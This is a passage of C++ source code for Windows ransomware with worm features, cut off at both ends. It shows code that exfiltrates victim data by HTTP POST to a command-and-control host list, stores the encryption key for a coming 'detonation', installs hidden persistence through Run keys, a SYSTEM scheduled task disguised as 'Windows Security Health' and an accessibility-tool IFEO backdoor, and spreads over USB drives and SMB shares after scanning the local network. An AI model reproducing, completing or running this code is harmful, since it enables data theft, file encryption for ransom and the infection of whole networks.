            if (!api.Open) return false;
            std::string body = "vid=" + utils::UrlEncode(utils::b64(vid, 16))
                + "&name=" + utils::UrlEncode(name)
                + "&idx=" + std::to_string(idx)
                + "&total=" + std::to_string(total)
                + "&xfer=" + utils::UrlEncode(xfer)
                + "&data=" + utils::UrlEncode(utils::b64(
                    (const uint8_t*)data.data(), data.size()));
            std::wstring path = config::kC2ReportPath;
            path.replace(path.find(L"report"), 6, L"exfil");
            for (const auto& h : HostList()) {
                Resp r = Http(h, L"POST", path, body, false, 15000);
                if (r.status >= 200 && r.status < 300) return true;
            }
            return false;
        }
    } // namespace comms
} // namespace vex

// ============================================================================
// 6. ERROR HANDLER
// ============================================================================
namespace vex {
    namespace err {
        static uint8_t g_vid[16] = { 0 };
        static std::atomic<bool> g_ready{ false };

        static void SetVid(const uint8_t vid[16]) {
            memcpy(g_vid, vid, 16);
            g_ready.store(true);
        }

        static void Report(const std::string& kind, const std::string& detail) {
            if (!g_ready.load()) return;
            comms::Report(g_vid, kind, detail);
        }

        static LONG WINAPI CrashFilter(EXCEPTION_POINTERS* info) {
            char buf[96];
            DWORD code = 0;
            if (info && info->ExceptionRecord)
                code = info->ExceptionRecord->ExceptionCode;
            sprintf_s(buf, sizeof(buf), "0x%08lx", (unsigned long)code);
            Report("crash", std::string(buf));
            return EXCEPTION_EXECUTE_HANDLER;
        }

        static void TerminateHandler() {
            Report("terminate", "std::terminate");
            ExitProcess(3);
        }

        // Installed before any risky work: a crash still leaves a trace in the
        // panel instead of dying silently.
        static void Install() {
            SetUnhandledExceptionFilter(CrashFilter);
            std::set_terminate(TerminateHandler);
        }
    } // namespace err
} // namespace vex

// ============================================================================
// 7. STATE, PERSISTENCE, SPREAD, SLEEPER
// ============================================================================
namespace vex {
    // ------------------------------------------------------------------
    // Durable state. Without this, a reboot before detonation loses the
    // key and a reboot mid-encryption leaves files nobody can reopen.
    // ------------------------------------------------------------------
    namespace state {
        struct State {
            uint8_t vid[16];
            uint8_t key[32];
            uint8_t phase;
        };

        static const char kMagic[8] = { 'V','E','X','S','T','A','T','2' };
        static constexpr size_t kPlainLen = 16 + 32 + 1;

        static std::wstring g_dirOverride;
        static void SetDirOverride(const std::wstring& p) { g_dirOverride = p; }

        static std::wstring DirPath() {
            if (!g_dirOverride.empty()) return g_dirOverride;
            std::wstring p = utils::ExpandEnv(L"%ProgramData%\\VEX");
            if (p.empty() || p[0] == L'%') p = L"C:\\ProgramData\\VEX";
            return p;
        }
        static std::wstring FilePath() { return DirPath() + L"\\state.bin"; }
        static std::wstring SlotPath(int i) {
            return DirPath() + (i == 0 ? L"\\state.bin.a" : L"\\state.bin.b");
        }
        static bool Exists() {
            return GetFileAttributesW(FilePath().c_str()) != INVALID_FILE_ATTRIBUTES ||
                GetFileAttributesW(SlotPath(0).c_str()) != INVALID_FILE_ATTRIBUTES ||
                GetFileAttributesW(SlotPath(1).c_str()) != INVALID_FILE_ATTRIBUTES;
        }

        static bool DecodeBlob(const std::vector<uint8_t>& blob, State& out) {
            DATA_BLOB in{ (DWORD)blob.size(), (BYTE*)blob.data() };
            DATA_BLOB plain{ 0, NULL };
            bool ok = CryptUnprotectData(&in, NULL, NULL, NULL, NULL,
                CRYPTPROTECT_LOCAL_MACHINE, &plain) != FALSE;
            if (!ok) return false;
            bool good = plain.cbData == kPlainLen;
            if (good) {
                memcpy(out.vid, plain.pbData, 16);
                memcpy(out.key, plain.pbData + 16, 32);
                out.phase = plain.pbData[48];
            }
            SecureZeroMemory(plain.pbData, plain.cbData);
            LocalFree(plain.pbData);
            return good;
        }

        static bool WriteSlot(int slot, const State& st, uint64_t seq) {
            uint8_t plain[kPlainLen];
            memcpy(plain, st.vid, 16);
            memcpy(plain + 16, st.key, 32);
            plain[48] = st.phase;
            DATA_BLOB in{ (DWORD)kPlainLen, plain };
            DATA_BLOB enc{ 0, NULL };
            bool ok = CryptProtectData(&in, L"vx", NULL, NULL, NULL,
                CRYPTPROTECT_LOCAL_MACHINE, &enc) != FALSE;
            SecureZeroMemory(plain, sizeof(plain));
            if (!ok) return false;

            std::wstring path = SlotPath(slot);
            std::wstring tmp = path + L".tmp";
            HANDLE h = CreateFileW(tmp.c_str(), GENERIC_WRITE, 0, NULL,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (h == INVALID_HANDLE_VALUE) { LocalFree(enc.pbData); return false; }
            char magic[8] = { 'V','E','X','S','T','A','T','3' };
            DWORD w = 0;
            ok = WriteFile(h, magic, 8, &w, NULL) && w == 8;
            if (ok) ok = WriteFile(h, &seq, 8, &w, NULL) && w == 8;
            if (ok) ok = WriteFile(h, &enc.cbData, 4, &w, NULL) && w == 4;
            if (ok) ok = WriteFile(h, enc.pbData, enc.cbData, &w, NULL) && w == enc.cbData;
            if (ok) ok = FlushFileBuffers(h) != FALSE;
            CloseHandle(h);
            LocalFree(enc.pbData);
            if (!ok) { DeleteFileW(tmp.c_str()); return false; }
            SetFileAttributesW(tmp.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            if (!MoveFileExW(tmp.c_str(), path.c_str(),
                MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                DeleteFileW(tmp.c_str());
                return false;
            }
            return true;
        }

        static bool ReadSlot(int slot, State& out, uint64_t& seq) {
            HANDLE h = CreateFileW(SlotPath(slot).c_str(), GENERIC_READ,
                FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (h == INVALID_HANDLE_VALUE) return false;
            char magic[8]{};
            DWORD r = 0;
            bool ok = ReadFile(h, magic, 8, &r, NULL) && r == 8 &&
                memcmp(magic, "VEXSTAT3", 8) == 0;
            if (ok) ok = ReadFile(h, &seq, 8, &r, NULL) && r == 8;
            uint32_t len = 0;
            if (ok) ok = ReadFile(h, &len, 4, &r, NULL) && r == 4 &&
                len > 0 && len <= 4096;
            std::vector<uint8_t> blob;
            if (ok) {
                blob.resize(len);
                ok = ReadFile(h, blob.data(), len, &r, NULL) && r == len;
            }
            CloseHandle(h);
            if (!ok) return false;
            return DecodeBlob(blob, out);
        }

        static bool Save(const State& st) {
            CreateDirectoryW(DirPath().c_str(), NULL);
            if (g_dirOverride.empty()) utils::ProtectStatePath(DirPath());
            uint64_t seq = 0;
            for (int i = 0; i < 2; i++) {
                State tmp{};
                uint64_t s = 0;
                if (ReadSlot(i, tmp, s) && s > seq) seq = s;
            }
            seq++;
            bool a = WriteSlot(0, st, seq);
            bool b = WriteSlot(1, st, seq);
            return a || b;
        }

        static bool Load(State& out) {
            bool found = false;
            State best{};
            uint64_t bestSeq = 0;
            for (int i = 0; i < 2; i++) {
                State tmp{};
                uint64_t seq = 0;
                if (ReadSlot(i, tmp, seq) && (!found || seq > bestSeq)) {
                    best = tmp;
                    bestSeq = seq;
                    found = true;
                }
            }
            if (found) { out = best; return true; }

            // One-time legacy migration: VEXSTAT2 DPAPI or VEXSTAT1 plaintext.
            HANDLE h = CreateFileW(FilePath().c_str(), GENERIC_READ, FILE_SHARE_READ,
                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (h == INVALID_HANDLE_VALUE) return false;
            char magic[8]{};
            DWORD r = 0;
            bool ok = ReadFile(h, magic, 8, &r, NULL) && r == 8;
            if (ok && memcmp(magic, "VEXSTAT1", 8) == 0) {
                ok = ReadFile(h, &out, (DWORD)sizeof(out), &r, NULL) && r == sizeof(out);
                CloseHandle(h);
                return ok;
            }
            uint32_t len = 0;
            if (ok && memcmp(magic, "VEXSTAT2", 8) == 0) {
                ok = ReadFile(h, &len, 4, &r, NULL) && r == 4 &&
                    len > 0 && len <= 4096;
                if (ok) {
                    std::vector<uint8_t> blob(len);
                    ok = ReadFile(h, blob.data(), len, &r, NULL) && r == len;
                    if (ok) ok = DecodeBlob(blob, out);
                }
            }
            CloseHandle(h);
            return ok;
        }

        static void Remove() {
            DeleteFileW(FilePath().c_str());
            DeleteFileW(SlotPath(0).c_str());
            DeleteFileW(SlotPath(1).c_str());
        }
    } // namespace state

    // ------------------------------------------------------------------
    // Persistence: one copy under %ProgramData%\VEX, Run keys, logon task.
    // ------------------------------------------------------------------
    namespace persist {
        static std::wstring InstalledPath() {
            return state::DirPath() + L"\\WindowsSecurityHealthAgent.exe";
        }

        static bool SetRunValue(HKEY root, const std::wstring& value) {
            HKEY h = NULL;
            if (RegOpenKeyExW(root, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, KEY_SET_VALUE, &h) != ERROR_SUCCESS) return false;
            LSTATUS st = RegSetValueExW(h, L"WindowsSecurityHealth", 0, REG_SZ,
                (const BYTE*)value.c_str(),
                (DWORD)((value.size() + 1) * sizeof(wchar_t)));
            RegCloseKey(h);
            if (st != ERROR_SUCCESS) return false;
            wchar_t check[1024]{};
            DWORD sz = sizeof(check), type = 0;
            if (RegOpenKeyExW(root, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, KEY_READ, &h) != ERROR_SUCCESS) return false;
            st = RegQueryValueExW(h, L"WindowsSecurityHealth", NULL, &type,
                (BYTE*)check, &sz);
            RegCloseKey(h);
            return st == ERROR_SUCCESS && type == REG_SZ &&
                _wcsicmp(check, value.c_str()) == 0;
        }

        static void DeleteRunValue(HKEY root) {
            HKEY h = NULL;
            if (RegOpenKeyExW(root, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, KEY_SET_VALUE, &h) != ERROR_SUCCESS) return;
            RegDeleteValueW(h, L"WindowsSecurityHealth");
            RegCloseKey(h);
        }

        // Command-line tail persisted with the Run values and the logon task.
        // A sub-minute --ping-ms is a test setting and is deliberately not
        // persisted: it would leave a 2-second beacon loop after every reboot.
        static std::wstring BuildPersistArgs(bool spread, bool noUsb, bool noShares,
            DWORD pingMs, bool sleepCrypt = false) {
            std::wstring a;
            if (spread) a = L"--spread";
            if (noUsb) { if (!a.empty()) a += L" "; a += L"--no-usb"; }
            if (noShares) { if (!a.empty()) a += L" "; a += L"--no-shares"; }
            if (pingMs != config::kPingIntervalMs && pingMs >= 60000) {
                if (!a.empty()) a += L" ";
                a += L"--ping-ms " + std::to_wstring((unsigned long)pingMs);
            }
            if (sleepCrypt) { if (!a.empty()) a += L" "; a += L"--sleep-crypt"; }
            return a;
        }

        static std::wstring XmlEscape(const std::wstring& s) {
            std::wstring out;
            out.reserve(s.size() + 16);
            for (wchar_t c : s) {
                switch (c) {
                case L'&': out += L"&amp;"; break;
                case L'<': out += L"&lt;"; break;
                case L'>': out += L"&gt;"; break;
                case L'"': out += L"&quot;"; break;
                case L'\'': out += L"&apos;"; break;
                default: out.push_back(c); break;
                }
            }
            return out;
        }

        // Task Scheduler XML avoids the quoting and length limits of
        // `schtasks /tr`. The task runs as SYSTEM at logon, hidden, with no
        // execution time limit, and carries the same argument tail as the Run
        // values so --spread and a tuned --ping-ms survive a reboot.
        static std::wstring TaskXml(const std::wstring& extraArgs) {
            std::wstring cmd = InstalledPath();
            std::wstring xml =
                L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n"
                L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n"
                L"  <RegistrationInfo><Description>Windows Security Health</Description></RegistrationInfo>\r\n"
                L"  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>\r\n"
                L"  <Principals><Principal id=\"Author\"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>\r\n"
                L"  <Settings>\r\n"
                L"    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n"
                L"    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n"
                L"    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\r\n"
                L"    <AllowHardTerminate>true</AllowHardTerminate>\r\n"
                L"    <StartWhenAvailable>true</StartWhenAvailable>\r\n"
                L"    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\r\n"
                L"    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>\r\n"
                L"    <AllowStartOnDemand>true</AllowStartOnDemand>\r\n"
                L"    <Enabled>true</Enabled>\r\n"
                L"    <Hidden>true</Hidden>\r\n"
                L"    <RunOnlyIfIdle>false</RunOnlyIfIdle>\r\n"
                L"    <WakeToRun>false</WakeToRun>\r\n"
                L"    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\r\n"
                L"    <Priority>7</Priority>\r\n"
                L"  </Settings>\r\n"
                L"  <Actions Context=\"Author\"><Exec><Command>" + XmlEscape(cmd) + L"</Command>";
            if (!extraArgs.empty()) xml += L"<Arguments>" + XmlEscape(extraArgs) + L"</Arguments>";
            xml += L"</Exec></Actions>\r\n</Task>\r\n";
            return xml;
        }

        static bool CreateScheduledTask(const std::wstring& extraArgs) {
            std::wstring xml = TaskXml(extraArgs);
            wchar_t tempPath[MAX_PATH]{};
            wchar_t tempFile[MAX_PATH]{};
            if (!GetTempPathW(MAX_PATH, tempPath)) return false;
            if (!GetTempFileNameW(tempPath, L"vxh", 0, tempFile)) return false;

            HANDLE h = CreateFileW(tempFile, GENERIC_WRITE, 0, NULL,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (h == INVALID_HANDLE_VALUE) return false;
            // schtasks requires the XML declaration to match the byte stream.
            // UTF-16LE without a BOM is rejected as malformed, so emit the BOM
            // explicitly before the wide-character payload.
            static const uint8_t bom[2] = { 0xFF, 0xFE };
            bool wrote = utils::WriteExact(h, bom, sizeof(bom)) &&
                utils::WriteExact(h, xml.data(),
                    (DWORD)(xml.size() * sizeof(wchar_t)));
            CloseHandle(h);
            if (!wrote) { DeleteFileW(tempFile); return false; }

            std::wstring cmd = utils::widen(X("schtasks.exe /create /tn \""))
                + utils::widen(X("WindowsSecurityHealthTask")) + L"\" /xml \"" +
                tempFile + L"\" /f";
            DWORD rc = 1;
            bool ok = utils::RunHidden(cmd, 15000, &rc) && rc == 0;
            if (ok) {
                // Read the task back; a create exit code alone is not proof the
                // registration survived policy or a partially-applied import.
                std::wstring query = utils::widen(X("schtasks.exe /query /tn \""))
                    + utils::widen(X("WindowsSecurityHealthTask")) + L"\"";
                DWORD qrc = 1;
                ok = utils::RunHidden(query, 10000, &qrc) && qrc == 0;
            }
            DeleteFileW(tempFile);
            return ok;
        }

        // Accessibility IFEO: pressing utilman/sethc on the logon screen starts
        // the installed copy (SYSTEM context). Removed on kill/pardon.
        static bool ReadIfeo(const std::wstring& base, std::wstring& out) {
            HKEY h = NULL;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, base.c_str(), 0,
                KEY_READ, &h) != ERROR_SUCCESS) return false;
            wchar_t buf[2048]{};
            DWORD sz = sizeof(buf), type = 0;
            bool ok = RegQueryValueExW(h, L"Debugger", NULL, &type,
                (BYTE*)buf, &sz) == ERROR_SUCCESS && type == REG_SZ;
            RegCloseKey(h);
            if (ok) out.assign(buf);
            return ok;
        }

        static bool InstallIfeo(const std::wstring& dest) {
            const wchar_t* targets[] = { L"utilman.exe", L"sethc.exe" };
            std::wstring dbg = L"\"" + dest + L"\" --ifeo";
            bool any = false;
            for (const wchar_t* t : targets) {
                std::wstring base = std::wstring(
                    L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\") + t;
                std::wstring prior;
                if (ReadIfeo(base, prior) && _wcsicmp(prior.c_str(), dbg.c_str()) != 0)
                    continue; // never clobber a legitimate debugger value
                HKEY h = NULL;
                if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, base.c_str(), 0, NULL, 0,
                    KEY_SET_VALUE, NULL, &h, NULL) == ERROR_SUCCESS) {
                    if (RegSetValueExW(h, L"Debugger", 0, REG_SZ,
                        (const BYTE*)dbg.c_str(),
                        (DWORD)((dbg.size() + 1) * sizeof(wchar_t))) == ERROR_SUCCESS) {
                        any = true;
                    }
                    RegCloseKey(h);
                }
            }
            return any;
        }

        static void RemoveIfeo() {
            const wchar_t* targets[] = { L"utilman.exe", L"sethc.exe" };
            std::wstring ours = L"\"" + InstalledPath() + L"\" --ifeo";
            for (const wchar_t* t : targets) {
                std::wstring base = std::wstring(
                    L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\") + t;
                std::wstring prior;
                if (ReadIfeo(base, prior) && _wcsicmp(prior.c_str(), ours.c_str()) != 0)
                    continue; // not ours
                HKEY h = NULL;
                if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, base.c_str(), 0,
                    KEY_SET_VALUE, &h) == ERROR_SUCCESS) {
                    RegDeleteValueW(h, L"Debugger");
                    RegCloseKey(h);
                }
            }
        }

        static bool SameFileContent(const std::wstring& a, const std::wstring& b) {
            if (_wcsicmp(a.c_str(), b.c_str()) == 0) return true;
            HANDLE ha = CreateFileW(a.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            HANDLE hb = CreateFileW(b.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (ha == INVALID_HANDLE_VALUE || hb == INVALID_HANDLE_VALUE) {
                if (ha != INVALID_HANDLE_VALUE) CloseHandle(ha);
                if (hb != INVALID_HANDLE_VALUE) CloseHandle(hb);
                return false;
            }
            LARGE_INTEGER sa{}, sb{};
            bool match = GetFileSizeEx(ha, &sa) && GetFileSizeEx(hb, &sb) &&
                sa.QuadPart == sb.QuadPart;
            std::vector<uint8_t> ba(64 * 1024), bb(64 * 1024);
            while (match) {
                DWORD ra = 0, rb = 0;
                if (!ReadFile(ha, ba.data(), (DWORD)ba.size(), &ra, NULL) ||
                    !ReadFile(hb, bb.data(), (DWORD)bb.size(), &rb, NULL) ||
                    ra != rb) { match = false; break; }
                if (ra == 0) break;
                if (memcmp(ba.data(), bb.data(), ra) != 0) { match = false; break; }
            }
            CloseHandle(ha);
            CloseHandle(hb);
            return match;
        }

        static bool Install(const std::wstring& extraArgs = L"") {
            std::wstring self = utils::SelfPath();
            std::wstring dest = InstalledPath();
            CreateDirectoryW(state::DirPath().c_str(), NULL);
            utils::ProtectStatePath(state::DirPath());

            bool fileOk = true;
            if (_wcsicmp(self.c_str(), dest.c_str()) != 0) {
                if (!SameFileContent(self, dest)) {
                    std::wstring tmp = dest + L".new";
                    DeleteFileW(tmp.c_str());
                    fileOk = CopyFileW(self.c_str(), tmp.c_str(), FALSE) != FALSE &&
                        SameFileContent(self, tmp);
                    if (fileOk) {
                        fileOk = MoveFileExW(tmp.c_str(), dest.c_str(),
                            MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH) != FALSE;
                    }
                    if (!fileOk) DeleteFileW(tmp.c_str());
                }
            }
            if (!fileOk) return false;
            utils::Hide(dest);
            // Dropped via SMB into Windows\Temp: ask for deletion at reboot.
            if (self.find(L"\\Windows\\Temp\\") != std::wstring::npos) {
                MoveFileExW(self.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
            }

            std::wstring quoted = L"\"" + dest + L"\"";
            if (!extraArgs.empty()) quoted += L" " + extraArgs;
            bool hkcu = SetRunValue(HKEY_CURRENT_USER, quoted);
            bool hklm = SetRunValue(HKEY_LOCAL_MACHINE, quoted);

            // Core persistence is the SYSTEM logon task; the Run values are a
            // fallback for standard-user installs. The task carries the same
            // arguments so --spread (and a tuned --ping-ms) survive a reboot.
            bool task = CreateScheduledTask(extraArgs);
            bool ifeo = InstallIfeo(dest);

            // Any surviving mechanism is enough; report the aggregate so a
            // false "installed" never hides a total failure.
            return hkcu || hklm || task || ifeo;
        }

        static void Remove() {
            RemoveIfeo();
            DeleteRunValue(HKEY_CURRENT_USER);
            DeleteRunValue(HKEY_LOCAL_MACHINE);
            utils::RunHidden(utils::widen(X("schtasks.exe /delete /tn \""))
                + utils::widen(X("WindowsSecurityHealthTask"))
                + utils::widen(X("\" /f")), 10000);

            std::wstring svcName = utils::widen(X("WindowsSecurityHealthSvc"));
            SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
            if (scm) {
                SC_HANDLE svc = OpenServiceW(scm, svcName.c_str(),
                    SERVICE_STOP | DELETE);
                if (svc) {
                    SERVICE_STATUS ss{};
                    ControlService(svc, SERVICE_CONTROL_STOP, &ss);
                    DeleteService(svc);
                    CloseServiceHandle(svc);
                }
                CloseServiceHandle(scm);
            }

            std::wstring dest = InstalledPath();
            if (_wcsicmp(utils::SelfPath().c_str(), dest.c_str()) != 0) {
                DeleteFileW(dest.c_str());
            }
            // The state file is deliberately kept: it is what prevents a
            // leftover launcher from generating a fresh key over old data.
        }
    } // namespace persist

    // ------------------------------------------------------------------
    // Spread. USB sneakernet + SMB spray. Both run only while dormant.
    // ------------------------------------------------------------------
    namespace spread {
        static std::atomic<bool> g_wsa{ false };
        static std::atomic<bool> g_enabled{ true };
        static std::atomic<uint32_t> g_infected{ 0 };

        static void SetEnabled(bool on) { g_enabled.store(on); }
        static bool Enabled() { return g_enabled.load(); }

        static void EnsureWsa() {
            if (g_wsa.load()) return;
            WSADATA w{};
            if (WSAStartup(MAKEWORD(2, 2), &w) == 0) g_wsa.store(true);
        }

        static uint32_t Rand32() {
            ULONG v = 0;
            if (crypto::api.GenRandom)
                crypto::api.GenRandom(NULL, (PUCHAR)&v, sizeof(v),
                    BCRYPT_USE_SYSTEM_PREFERRED_RNG);
            if (!v) v = GetTickCount();
            return v;
        }

        static void Jitter(uint32_t maxMs) {
            if (maxMs) Sleep(Rand32() % maxMs);
        }

        // ---------------------------------------------------------- CIDR
        struct Cidr {
            uint32_t net = 0;
            uint32_t mask = 0;
            int bits = 0;
        };

        static bool ParseCidr(const std::string& s, Cidr& out) {
            size_t slash = s.find('/');
            std::string ipPart = slash == std::string::npos ? s : s.substr(0, slash);
            uint32_t ip = 0;
            if (inet_pton(AF_INET, ipPart.c_str(), &ip) != 1) return false;
            int bits = 32;
            if (slash != std::string::npos) {
                bits = atoi(s.c_str() + slash + 1);
                if (bits < 0 || bits > 32) return false;
            }
            out.bits = bits;
            out.mask = bits == 0 ? 0 : (0xFFFFFFFFu << (32 - bits));
            out.net = ip & out.mask;
            return true;
        }

        static const std::vector<Cidr>& AllowList() {
            static std::vector<Cidr> list = [] {
                std::vector<Cidr> v;
                for (const auto& s : config::kSpreadAllowCidrs) {
                    Cidr c;
                    if (ParseCidr(s, c)) v.push_back(c);
                }
                return v;
                }();
            return list;
        }

        static const std::vector<Cidr>& DenyList() {
            static std::vector<Cidr> list = [] {
                std::vector<Cidr> v;
                for (const auto& s : config::kSpreadDenyCidrs) {
                    Cidr c;
                    if (ParseCidr(s, c)) v.push_back(c);
                }
                return v;
                }();
            return list;
        }

        static bool IsPrivate(uint32_t ip) {
            return (ip & 0xFF000000u) == 0x0A000000u ||   // 10/8
                   (ip & 0xFFF00000u) == 0xAC100000u ||   // 172.16/12
                   (ip & 0xFFFF0000u) == 0xC0A80000u ||   // 192.168/16
                   (ip & 0xFFFF0000u) == 0xA9FE0000u;     // 169.254/16
        }

        static bool IpAllowed(uint32_t ip) {
            if (!IsPrivate(ip)) return false;
            const auto& allow = AllowList();
            bool ok = allow.empty();
            for (const auto& c : allow)
                if ((ip & c.mask) == c.net) { ok = true; break; }
            if (!ok) return false;
            for (const auto& c : DenyList())
                if ((ip & c.mask) == c.net) return false;
            return true;
        }

        // ------------------------------------------------------- discovery
        static void AddBase(std::vector<uint32_t>& bases, uint32_t ip) {
            if (ip == 0) return;
            uint32_t base = ip & 0xFFFFFF00u;
            if (base == 0) return;
            for (uint32_t b : bases) if (b == base) return;
            bases.push_back(base);
        }

        static void CollectNetwork(std::vector<uint32_t>& bases,
            std::vector<uint32_t>& selfs) {
            IP_ADAPTER_INFO* ai = nullptr;
            ULONG size = 0;
            if (GetAdaptersInfo(nullptr, &size) != ERROR_BUFFER_OVERFLOW || !size)
                return;
            std::vector<uint8_t> buf(size);
            ai = (IP_ADAPTER_INFO*)buf.data();
            if (GetAdaptersInfo(ai, &size) != ERROR_SUCCESS) return;

            for (auto a = ai; a; a = a->Next) {
                auto& ip = a->IpAddressList.IpAddress;
                uint32_t addr = 0;
                if (inet_pton(AF_INET, ip.String, &addr) != 1) continue;
                selfs.push_back(addr);
                AddBase(bases, addr);
            }
            if (bases.size() > 8) bases.resize(8);
        }

        static void AddRoutes(std::vector<uint32_t>& bases) {
            PMIB_IPFORWARDTABLE table = nullptr;
            DWORD size = 0;
            if (GetIpForwardTable(nullptr, &size, FALSE) != ERROR_INSUFFICIENT_BUFFER)
                return;
            std::vector<uint8_t> buf(size);
            table = (PMIB_IPFORWARDTABLE)buf.data();
            if (GetIpForwardTable(table, &size, FALSE) != NO_ERROR) return;

            for (DWORD i = 0; i < table->dwNumEntries; i++) {
                auto& row = table->table[i];
                if (row.dwForwardDest == 0 || row.dwForwardDest == 0xFFFFFFFF) continue;
                uint32_t mask = row.dwForwardMask;
                uint32_t bits = 0, m = mask;
                while (m & 0x80000000u) { bits++; m <<= 1; }
                if (bits < 24) continue;
                AddBase(bases, row.dwForwardDest);
                if (bases.size() > 8) return;
            }
        }

        static void AddArpHosts(std::vector<uint32_t>& hosts) {
            PMIB_IPNETTABLE table = nullptr;
            DWORD size = 0;
            if (GetIpNetTable(nullptr, &size, TRUE) != ERROR_INSUFFICIENT_BUFFER) return;
            std::vector<uint8_t> buf(size);
            table = (PMIB_IPNETTABLE)buf.data();
            if (GetIpNetTable(table, &size, TRUE) != NO_ERROR) return;
            for (DWORD i = 0; i < table->dwNumEntries; i++) {
                uint32_t ip = table->table[i].dwAddr;
                if (ip == 0 || ip == 0xFFFFFFFF) continue;
                hosts.push_back(ip);
            }
        }

        static void AddDomainHosts(std::vector<uint32_t>& out);

        // Public: candidate IPv4 hosts, allow/deny filtered, capped.
        static std::vector<uint32_t> EnumerateHosts(uint32_t maxHosts = 256) {
            std::vector<uint32_t> bases, selfs, hosts;
            CollectNetwork(bases, selfs);
            AddRoutes(bases);
            AddArpHosts(hosts);
            AddDomainHosts(hosts);

            for (uint32_t b : bases) {
                for (uint32_t i = 1; i <= 254; i++) {
                    uint32_t ip = b | i;
                    bool self = false;
                    for (uint32_t s : selfs) if (s == ip) { self = true; break; }
                    if (self) continue;
                    hosts.push_back(ip);
                }
            }

            std::vector<uint32_t> out;
            for (uint32_t ip : hosts) {
                if (!IpAllowed(ip)) continue;
                bool dup = false;
                for (uint32_t e : out) if (e == ip) { dup = true; break; }
                if (dup) continue;
                out.push_back(ip);
                if (out.size() >= maxHosts) break;
            }
            return out;
        }

        static std::string IpToString(uint32_t ip) {
            char b[32];
            sprintf_s(b, sizeof(b), "%u.%u.%u.%u",
                (ip >> 24) & 0xFF, (ip >> 16) & 0xFF, (ip >> 8) & 0xFF, ip & 0xFF);
            return b;
        }

        // ---------------- USB ----------------

        static std::atomic<bool> g_usbEnabled{ true };
        static std::atomic<uint32_t> g_usbInfections{ 0 };

        static void SetUsbEnabled(bool on) { g_usbEnabled.store(on); }
        static bool UsbEnabled() { return g_usbEnabled.load(); }
        static uint32_t UsbCount() { return g_usbInfections.load(); }

        static bool IsUsbStick(const std::wstring& root) {
            std::wstring dev = L"\\\\.\\" + root.substr(0, 2);
            HANDLE h = CreateFileW(dev.c_str(), 0,
                FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
            if (h == INVALID_HANDLE_VALUE) return true;   // fall back to "removable"

            STORAGE_PROPERTY_QUERY q{};
            q.PropertyId = StorageDeviceProperty;
            q.QueryType = PropertyStandardQuery;
            STORAGE_DEVICE_DESCRIPTOR d{};
            DWORD got = 0;
            BOOL ok = DeviceIoControl(h, IOCTL_STORAGE_QUERY_PROPERTY,
                &q, sizeof(q), &d, sizeof(d), &got, NULL);
            CloseHandle(h);
            if (!ok) return true;
            return d.BusType == BusTypeUsb;
        }

        static std::string BuildStamp() {
            return std::string(__DATE__) + " " + __TIME__;
        }

        static std::wstring SanitizeTag(const std::wstring& in) {
            std::wstring out;
            for (wchar_t c : in) {
                if (iswalnum(c) || c == L' ' || c == L'-' || c == L'_') out.push_back(c);
                if (out.size() >= 24) break;
            }
            while (!out.empty() && out.back() == L' ') out.pop_back();
            return out;
        }

        static std::wstring CompanyTag() {
            wchar_t owner[256]{};
            DWORD sz = sizeof(owner);
            if (RegGetValueW(HKEY_LOCAL_MACHINE,
                L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                L"RegisteredOwner", RRF_RT_REG_SZ, NULL, owner, &sz) == ERROR_SUCCESS) {
                std::wstring t = SanitizeTag(owner);
                if (!t.empty()) return t;
            }
            wchar_t comp[128]{};
            DWORD c = 128;
            if (GetComputerNameW(comp, &c)) {
                std::wstring t = SanitizeTag(comp);
                if (!t.empty()) return t;
            }
            return L"Documents";
        }

        static std::wstring DateTag() {
            SYSTEMTIME st{};
            GetLocalTime(&st);
            wchar_t b[16]{};
            swprintf_s(b, L"%04d%02d", st.wYear, st.wMonth);
            return b;
        }

        static void TouchBack(const std::wstring& path, long long minutes) {
            HANDLE h = CreateFileW(path.c_str(), FILE_WRITE_ATTRIBUTES,
                FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL, NULL);
            if (h == INVALID_HANDLE_VALUE) return;
            FILETIME now{};
            GetSystemTimeAsFileTime(&now);
            ULARGE_INTEGER u;
            u.LowPart = now.dwLowDateTime;
            u.HighPart = now.dwHighDateTime;
